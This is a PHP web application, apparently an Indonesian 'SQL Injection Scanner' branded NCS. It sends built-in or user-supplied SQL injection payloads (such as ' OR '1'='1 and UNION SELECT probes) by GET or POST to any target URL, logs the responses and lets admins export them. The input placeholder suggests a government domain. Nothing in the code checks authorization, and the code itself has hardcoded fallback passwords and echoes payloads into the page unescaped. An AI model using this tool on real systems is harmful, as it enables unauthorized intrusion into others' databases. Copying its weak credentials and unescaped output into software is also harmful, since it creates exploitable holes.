<?php
session_start();

// Load konfigurasi login dari environment
$ADMIN_PASSWORD = getenv('ADMIN_PASS') ?: 'adminncs';
$USER_PASSWORD = getenv('USER_PASS') ?: 'userpass';
$USERS = [
    'admin' => ['password' => $ADMIN_PASSWORD, 'role' => 'admin'],
    'user' => ['password' => $USER_PASSWORD, 'role' => 'user']
];

// Koneksi database SQLite untuk log
try {
    $db = new PDO('sqlite:' . __DIR__ . '/sqli_logs.db');
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->exec("CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        datetime TEXT,
        user TEXT,
        target TEXT,
        method TEXT,
        payload TEXT,
        status INTEGER,
        size INTEGER,
        response TEXT
    )");
} catch (PDOException $e) {
    die("DB Error: " . $e->getMessage());
}

function showLogin($error = '') {
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title><style>
    body{font-family:sans-serif;background:#1a1a1a;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
    form{background:#2a2a2a;padding:30px;border-radius:8px;box-shadow:0 0 20px rgba(0,0,0,0.5);width:90%;max-width:320px}
    input{width:100%;padding:10px;margin:10px 0;background:#333;border:none;border-radius:6px;color:#fff;font-size:1rem}
    button{width:100%;padding:10px;background:#03dac6;border:none;color:#000;font-weight:bold;border-radius:6px;cursor:pointer;font-size:1rem;transition:background 0.3s}
    button:hover{background:#00bfa5}
    .error{color:#ff6b6b;margin-top:10px;font-size:0.9rem}
    </style></head><body><form method="post">
    <h2 style="text-align:center;">LOGIN TOOLS NCS</h2>
    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Masuk</button>';
    if ($error) echo '<div class="error">' . $error . '</div>';
    echo '</form></body></html>';
    exit;
}

if (!isset($_SESSION['login'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username'], $_POST['password'])) {
        $u = $_POST['username'];
        $p = $_POST['password'];
        if (isset($USERS[$u]) && $USERS[$u]['password'] === $p) {
            $_SESSION['login'] = true;
            $_SESSION['user'] = $u;
            $_SESSION['role'] = $USERS[$u]['role'];
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            showLogin("Username atau password salah.");
        }
    } else {
        showLogin();
    }
}

$user = $_SESSION['user'];
$role = $_SESSION['role'];

$results = '';
$alerts = [];
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['target'], $_POST['method'])) {
    $target = $_POST['target'];
    $method = $_POST['method'];
    $payloads = trim($_POST['payloads']) !== '' ? explode("\n", trim($_POST['payloads'])) : [
        "' OR '1'='1",
        "admin'--",
        "' OR 1=1 LIMIT 1--",
        "' UNION SELECT NULL,NULL--"
    ];

    $success = 0;
    foreach ($payloads as $payload) {
        $payload = trim($payload);
        $ch = curl_init();
        if ($method === 'GET') {
            curl_setopt($ch, CURLOPT_URL, $target . urlencode($payload));
        } else {
            curl_setopt($ch, CURLOPT_URL, $target);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, "input=" . urlencode($payload));
        }
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $res = curl_exec($ch);
        $info = curl_getinfo($ch);
        $error = curl_error($ch);
        curl_close($ch);

        $status = $info['http_code'] ?? 0;
        $size = strlen($res);
        $preview = htmlspecialchars(substr($res, 0, 300));

        if ($error) $alerts[] = "Curl Error: $error";

        $results .= "<div class='card'><strong>Payload:</strong> <code>$payload</code><br><strong>Status:</strong> $status<br><strong>Ukuran:</strong> $size byte<br><pre>$preview</pre></div>";

        $stmt = $db->prepare("INSERT INTO logs(datetime,user,target,method,payload,status,size,response) VALUES(datetime('now'),?,?,?,?,?,?,?)");
        $stmt->execute([$user, $target, $method, $payload, $status, $size, substr($res, 0, 500)]);

        if ($status >= 200 && $status < 400) $success++;
    }
    $_SESSION['stats'] = "Total: " . count($payloads) . ", Berhasil: $success";
}

if (isset($_GET['export']) && $role === 'admin') {
    header('Content-Type: text/plain');
    header('Content-Disposition: attachment; filename="sqli_log.txt"');
    $logs = $db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 100")->fetchAll(PDO::FETCH_ASSOC);
    foreach ($logs as $log) {
        echo "[{$log['datetime']}] {$log['user']} - {$log['payload']} ({$log['status']})\n";
    }
    exit;
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}
?><!DOCTYPE html><html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SQLi NEWBIE CYBER SECURITY</title>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      padding: 20px;
      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
      color: #fff;
    }
    input, select, textarea, button {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 6px;
      border: none;
      background: #1e1e1e;
      color: #fff;
      font-size: 1rem;
    }
    button {
      background: #03dac6;
      color: #000;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover { background: #00bfa5; }
    .card {
      background: #1a1a1a;
      padding: 15px;
      border-left: 4px solid #03dac6;
      margin-top: 10px;
      border-radius: 6px;
      overflow-x: auto;
    }
    pre {
      white-space: pre-wrap;
      word-break: break-word;
      background: #222;
      padding: 10px;
      border-radius: 6px;
    }
    header {
      display: flex;
      flex-direction: column;
      gap: 10px;
      align-items: flex-start;
      margin-bottom: 20px;
    }
    header div {
      font-size: 0.9rem;
    }
    a {
      color: #03dac6;
      text-decoration: none;
    }
    .alert {
      background: #ff5252;
      padding: 10px;
      margin: 10px 0;
      border-radius: 6px;
    }
    footer {
      margin-top: 40px;
      text-align: center;
      font-size: 0.9rem;
      opacity: 0.8;
    }
    @media (min-width: 600px) {
      header {
        flex-direction: row;
        justify-content: space-between;
        align-items: center;
      }
    }
  </style>
</head>
<body>
  <header>
    <h2>🛡️ SQL Injection Scanner - By NCS</h2>
    <div>👤 <?= htmlspecialchars($user) ?> | <a href="?logout">Logout</a></div>
  </header>
  <?php foreach ($alerts as $a) echo "<div class='alert'>⚠️ $a</div>"; ?>
  <form method="post">
    <label>🎯 Target URL:</label>
    <input type="text" name="target" placeholder="http://newbiecybersecurity.go.id/page.php?id=" required>
    <label>🔧 Metode:</label>
    <select name="method"><option value="GET">GET</option><option value="POST">POST</option></select>
    <label>💉 Payloads SQL:</label>
    <textarea name="payloads" rows="6"></textarea>
    <button type="submit">🚀 Jalankan</button>
  </form>
  <p><?= $_SESSION['stats'] ?? '' ?></p>
  <p><?php if ($role === 'admin') echo '<a href="?export=1">📁 Export Log</a>'; ?></p>
  <?= $results ?>
  <footer>
    &copy; <?= date('Y') ?> SQLi Scanner By NCS | gmail: <a href="mailto:offcncs@gmail.com">offcncs@gmail.com</a>
  </footer>
</body>
</html>